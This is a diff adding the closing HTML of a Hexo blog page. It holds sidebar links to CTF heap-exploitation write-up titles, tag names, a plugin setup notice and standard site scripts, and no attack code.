+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/2019/09/11/护网杯-silentheap-writeup/" >护网杯 silentheap writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/2019/09/11/护网杯-mergeheap-Writeup/" >护网杯 mergeheap Writeup</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="tcache"><span class="iconfont-archer">&#xe606;</span>tcache</span>
+    
+        <span class="sidebar-tag-name" data-tags="off-by-null"><span class="iconfont-archer">&#xe606;</span>off-by-null</span>
+    
+        <span class="sidebar-tag-name" data-tags="_IO_2_1_stdout_"><span class="iconfont-archer">&#xe606;</span>_IO_2_1_stdout_</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="pwn"><span class="iconfont-archer">&#xe60a;</span>pwn</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "jcxp"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
